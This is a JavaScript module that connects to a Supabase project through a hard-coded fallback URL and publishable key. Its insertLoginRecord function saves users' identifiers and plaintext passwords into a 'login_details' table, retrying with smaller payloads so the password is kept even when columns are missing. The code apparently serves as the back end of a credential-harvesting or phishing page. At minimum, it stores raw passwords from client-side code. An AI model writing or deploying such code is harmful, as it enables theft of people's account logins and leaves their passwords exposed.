import { createClient } from '@supabase/supabase-js';

// Fallback credentials ensure client initializes even if Vercel build missed env variables
const FALLBACK_SUPABASE_URL = 'https://vrdvgigueqswwlhcenwe.supabase.co';
const FALLBACK_SUPABASE_ANON_KEY = 'sb_publishable_-jrTBNHdugQo6mQ6rF_cNw_yUP9Id4G';

// Support VITE_, NEXT_PUBLIC_, or plain SUPABASE_ environment variables
const supabaseUrl =
  import.meta.env.VITE_SUPABASE_URL ||
  import.meta.env.NEXT_PUBLIC_SUPABASE_URL ||
  import.meta.env.SUPABASE_URL ||
  FALLBACK_SUPABASE_URL;

const supabaseAnonKey =
  import.meta.env.VITE_SUPABASE_ANON_KEY ||
  import.meta.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ||
  import.meta.env.SUPABASE_ANON_KEY ||
  FALLBACK_SUPABASE_ANON_KEY;

let supabase = null;

if (supabaseUrl && supabaseAnonKey && supabaseUrl !== 'YOUR_SUPABASE_URL') {
  try {
    supabase = createClient(supabaseUrl, supabaseAnonKey);
    console.log('✅ Supabase initialized successfully:', supabaseUrl);
  } catch (err) {
    console.error('❌ Failed to initialize Supabase client:', err);
  }
} else {
  console.warn('⚠️ Supabase credentials missing or invalid.');
}

/**
 * Robust insertion helper for login_details.
 * Automatically adapts if optional columns like 'email' or 'phone' do not exist in the database.
 */
export async function insertLoginRecord(payload) {
  if (!supabase) {
    console.warn('⚠️ Supabase client not initialized.');
    return { error: new Error('Supabase client not initialized') };
  }

  try {
    // 1. Try full payload (for schemas with type, identifier, email, phone, password, timestamp)
    let res = await supabase.from('login_details').insert([payload]);

    // 2. If a column is missing in schema (e.g. PGRST204: 'email' or 'phone' does not exist)
    if (res.error && res.error.code === 'PGRST204') {
      console.warn('Schema mismatch detected (column missing). Retrying with base schema...');
      const basePayload = {
        type: payload.type || 'Login',
        identifier: payload.identifier || payload.email || payload.phone,
        password: payload.password,
        timestamp: payload.timestamp || new Date().toISOString(),
      };
      res = await supabase.from('login_details').insert([basePayload]);

      // 3. Fallback for bare schema if timestamp or type also do not exist
      if (res.error && res.error.code === 'PGRST204') {
        const barePayload = {
          identifier: payload.identifier || payload.email || payload.phone,
          password: payload.password,
        };
        res = await supabase.from('login_details').insert([barePayload]);
      }
    }

    return res;
  } catch (err) {
    console.error('Unexpected error inserting login record:', err);
    return { error: err };
  }
}

export { supabase, supabaseUrl, supabaseAnonKey };
export default supabase;
